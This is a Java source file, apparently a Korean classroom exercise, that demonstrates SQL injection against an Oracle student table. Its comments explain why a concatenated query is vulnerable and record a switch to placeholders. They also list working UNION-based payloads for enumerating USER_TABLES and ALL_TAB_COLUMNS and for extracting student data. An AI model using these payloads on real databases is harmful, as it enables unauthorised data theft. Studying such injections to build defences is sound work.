...
public class StudentInjectMain {
	public static void main(String[] args) {
		...
		try {
			...
			// select 쿼리문작성 - preparedStatemt를 사용했지만 ?를 쓰지않고 동적 쿼리 구성 - SQL인젝션취약점이 발생하게 됨
			// String sql = "select * from student where stdNo = '" + studentNo + "'";
			// PLACEHODER 사용방식으로 변경
 ...
 * 
 * 학생이름은 두번째 컬럼에 저장되어 있음
 * ' OR 1=1 UNION SELECT 'a','c',0,'a',null,'b' from dual --
 */

//////////////////////////////////////////////////////////////
/// 전체 데이터 탈취
/// 오라클은 사용자가 생성한 테이블의 정보가 담긴 'USER_TABLE'를 제공함
/// 권한지정이 따로 되어 있지 않다면 일반계정도 접근 가능
/// 테이블 정보에서 테이블명만 추출 - 문자열로 제공 UNION 공격시 문자열 컬럼 순번에 해당 컬럼을 추출
///
/// ' OR 1=1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL from USER_TABLES --
///
/// 컬럼명을 확인하기 위한 공격문구
/// ' OR 1=1 UNION SELECT TABLE_NAME,DATA_TYPE,NULL,NULL,NULL,NULL from ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT' --
...
/// 학생 주소와 DPTNO 데이터 탈취
/// DATE 타입은 STDBIRTH 컬럼은 날짜를 문자로 변경해서 정보탈취 TO_CHAR()
/// ' OR 1=1 UNION SELECT STD_BIRTH,NULL,NULL,NULL,NULL,NULL from STUDENT --
